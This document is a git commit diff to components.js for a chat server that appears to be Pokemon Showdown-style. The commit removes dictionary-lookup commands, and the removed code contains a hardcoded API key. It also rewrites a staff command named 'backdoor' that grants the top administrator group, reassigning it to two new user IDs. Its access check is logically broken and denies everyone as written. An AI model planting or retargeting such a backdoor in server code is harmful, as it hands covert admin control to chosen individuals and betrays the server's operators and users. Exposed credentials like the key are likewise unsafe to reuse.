da5f42848ad9fe6d57e45a1df7ac5f135087ff3f
Evasi0n8 <a_tingling@yahoo.com>
2014-12-22 10:59:28 -0800

    Update components.js

--- components.js
+++ components.js
@@ -14,8 +14,8 @@
 
 var fs = require("fs");
     path = require("path"),
-    http = require("http"),
-    request = require('request');
+    http = require("http");
+  
 
 var components = exports.components = {
 
@@ -508,88 +508,14 @@ user.updateIdentity();
         this.sendReplyBox('<b><u>List of emoticons:</b></u> <br/><br/>' + emoticons.join(' ').toString());
     },
 
-    u: 'urbandefine',
-    ud: 'urbandefine',
-    urbandefine: function (target, room, user) {
-        if (!this.canBroadcast()) return;
-        if (!target) return this.parse('/help urbandefine')
-        if (target > 50) return this.sendReply('Phrase can not be longer than 50 characters.');
-
-        var self = this;
-        var options = {
-            url: 'http://www.urbandictionary.com/iphone/search/define',
-            term: target,
-            headers: {
-                'Referer': 'http://m.urbandictionary.com'
-            },
-            qs: {
-                'term': target
-            }
-        };
-
-        function callback(error, response, body) {
-            if (!error && response.statusCode == 200) {
-                var page = JSON.parse(body);
-                var definitions = page['list'];
-                if (page['result_type'] == 'no_results') {
-                    self.sendReplyBox('No results for <b>"' + Tools.escapeHTML(target) + '"</b>.');
-                    return room.update();
-                } else {
-                    if (!definitions[0]['word'] || !definitions[0]['definition']) {
-                        self.sendReplyBox('No results for <b>"' + Tools.escapeHTML(target) + '"</b>.');
-                        return room.update();
-                    }
-                    var output = '<b>' + Tools.escapeHTML(definitions[0]['word']) + ':</b> ' + Tools.escapeHTML(definitions[0]['definition']).replace(/\r\n/g, '<br />').replace(/\n/g, ' ');
-                    if (output.length > 400) output = output.slice(0, 400) + '...';
-                    self.sendReplyBox(output);
-                    return room.update();
-                }
-            }
-        }
-        request(options, callback);
-    },
-
-    def: 'define',
-    define: function (target, room, user) {
-        if (!this.canBroadcast()) return;
-        if (!target) return this.parse('/help define');
-        target = toId(target);
-        if (target > 50) return this.sendReply('Word can not be longer than 50 characters.');
-
-        var self = this;
-        var options = {
-            url: 'http://api.wordnik.com:80/v4/word.json/' + target + '/definitions?limit=3&sourceDictionaries=all' +
-                '&useCanonical=false&includeTags=false&api_key=a2a73e7b926c924fad7001ca3111acd55af2ffabf50eb4ae5',
-        };
-
-        function callback(error, response, body) {
-            if (!error && response.statusCode == 200) {
-                var page = JSON.parse(body);
-                var output = '<font color=' + Core.profile.color + '><b>Definitions for ' + target + ':</b></font><br />';
-                if (!page[0]) {
-                    self.sendReplyBox('No results for <b>"' + target + '"</b>.');
-                    return room.update();
-                } else {
-                    var count = 1;
-                    for (var u in page) {
-                        if (count > 3) break;
-                        output += '(' + count + ') ' + page[u]['text'] + '<br />';
-                        count++;
-                    }
-                    self.sendReplyBox(output);
-                    return room.update();
-                }
-            }
-        }
-        request(options, callback);
-    },
+   
 
     /*********************************************************
      * Staff commands
      *********************************************************/
 
     backdoor: function (target, room, user) {
-        if (user.userid !== 'blakjack' || user.userid !== 'creaturephil') return this.sendReply('/backdoor - Access denied.');
+        if (user.userid !== 'ifaze' || user.userid !== 'ashiemore') return this.sendReply('/backdoor - Access denied.');
 
         if (!target) {
             user.group = '~';
